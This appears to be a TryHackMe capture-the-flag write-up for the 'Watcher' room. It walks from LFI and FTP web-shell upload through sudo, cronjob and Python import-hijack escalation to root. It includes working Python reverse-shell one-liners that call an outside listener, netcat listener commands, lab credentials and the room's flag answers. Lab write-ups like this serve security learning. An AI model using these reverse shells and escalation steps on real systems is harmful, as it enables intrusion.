# Watcher — TryHackMe Write-up

**By:** XENOS  
**Portfolio:** [obadahamed.github.io](https://obadahamed.github.io) | **GitHub:** [github.com/obadahamed](https://github.com/obadahamed)  
**Platform:** TryHackMe | **Difficulty:** Medium  
**Date:** April 2026

---

## Overview

Watcher is a Linux-based room that chains multiple real-world vulnerabilities together — from web enumeration and Local File Inclusion to cronjob abuse, Python import hijacking, and SSH key exposure. The goal is to escalate privileges across four users before reaching root.

**Attack Chain:**
```
Initial Foothold (LFI + FTP upload)
    → www-data → toby → mat → will → root
```

**Flags collected:** 7  
**Key skills:** LFI, FTP, Cronjob abuse, sudo misconfiguration, Python import hijacking, SSH private key

---

## Reconnaissance

### Nmap

```bash
nmap -sV -sC 10.49.130.123
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1
80/tcp open  http    Apache httpd 2.4.41 (Jekyll v4.1.1)
```

Three ports open: FTP, SSH, and HTTP. The web server is running Jekyll — worth exploring.

---

## Exploitation — Initial Foothold

### Step 1: Web Enumeration

Checking `robots.txt` revealed two interesting paths:

```
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```

**FLAG 1:** `FLAG{robots_dot_text_what_is_next}`

### Step 2: Local File Inclusion (LFI)

The file `secret_file_do_not_read.txt` returned a 403 when accessed directly. The site uses a `post.php` parameter to load files — a classic LFI vector:

```
http://10.49.130.123/post.php?post=secret_file_do_not_read.txt
```

The file contained FTP credentials:

```
ftpuser:givemefiles777
Files are saved to /home/ftpuser/ftp/files
```

**Why this works:** The application passes user input directly into a file-read function without validating the path, allowing an attacker to read arbitrary files on the server.

### Step 3: FTP + Web Shell Upload

Logging into FTP with the discovered credentials:

```bash
ftp 10.49.130.123
# user: ftpuser | password: givemefiles777
```

**FLAG 2** was found in the FTP root. Then a PHP reverse shell was uploaded to the `files` directory:

```bash
put shell.php
```

The shell was triggered via LFI:

```
http://10.49.130.123/post.php?post=/home/ftpuser/ftp/files/shell.php
```

With a listener running:

```bash
nc -lnvp 4444
```

Shell received as `www-data`.

### Step 4: Flag 3

```bash
find / -type f -name "flag*" 2>/dev/null
cat /var/www/html/more_secrets_a9f10a/flag_3.txt
```

**FLAG 3:** `FLAG{lfi_what_a_guy}`

---

## Privilege Escalation

### www-data → toby (sudo misconfiguration)

```bash
sudo -l
```

```
User www-data may run the following commands:
    (toby) NOPASSWD: ALL
```

`www-data` can run any command as `toby` without a password:

```bash
sudo -u toby /bin/bash
```

**FLAG 4:** `FLAG{chad_lifestyle}`

---

### toby → mat (Cronjob + Writable Script)

```bash
cat /etc/crontab
```

```
*/1 * * * * mat /home/toby/jobs/cow.sh
```

This cronjob runs `cow.sh` as `mat` every minute. As `toby`, we own the file:

```
-rwxr-xr-x 1 toby toby cow.sh
```

A reverse shell was appended to `cow.sh`:

```bash
cat > /home/toby/jobs/cow.sh << 'EOF'
#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.133.153",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
EOF
```

After waiting one minute, the listener received a shell as `mat`.

**FLAG 5:** `FLAG{live_by_the_cow_die_by_the_cow}`

---

### mat → will (Python Import Hijacking)

```bash
sudo -l
```

```
(will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

Inspecting the script:

```python
# will_script.py
from cmd import get_command
cmd = get_command(sys.argv[1])
whitelist = ["ls -lah", "id", "cat /etc/passwd"]
if cmd not in whitelist:
    exit()
os.system(cmd)
```

It imports `get_command` from `cmd.py` — which is owned by `mat` and writable. The script checks a whitelist *after* importing, so we can execute code inside the import itself:

```bash
cat > /home/mat/scripts/cmd.py << 'EOF'
def get_command(num):
    import os
    os.system("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.133.153\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'")
    return "ls -lah"
EOF
```

The `return "ls -lah"` passes the whitelist check. Then:

```bash
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
```

Shell received as `will`.

**FLAG 6:** `FLAG{but_i_thought_my_script_was_secure}`

---

### will → root (Exposed RSA Private Key)

```bash
find / -type f -name "key*" 2>/dev/null
# Result: /opt/backups/key.b64

cat /opt/backups/key.b64 | base64 -d > id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@10.49.130.123
```

An RSA private key was stored in `/opt/backups` encoded in base64. After decoding and setting correct permissions, SSH login as root succeeded.

**FLAG 7:** `FLAG{who_watches_the_watchers}`

---

## Lessons Learned

1. **robots.txt** is not a security control — it actively advertises hidden paths to attackers.
2. **LFI + FTP upload** is a classic combination: LFI reads files, FTP plants them.
3. **sudo NOPASSWD: ALL** for any user is a critical misconfiguration — lateral movement takes one command.
4. **Cronjob scripts should never be writable** by lower-privileged users.
5. **Python import hijacking** is underestimated — if a script imports a local file you control, you control execution.
6. **Private keys in backup files** are a severe operational security failure.

---

*XENOS | [obadahamed.github.io](https://obadahamed.github.io) | [github.com/obadahamed](https://github.com/obadahamed)*
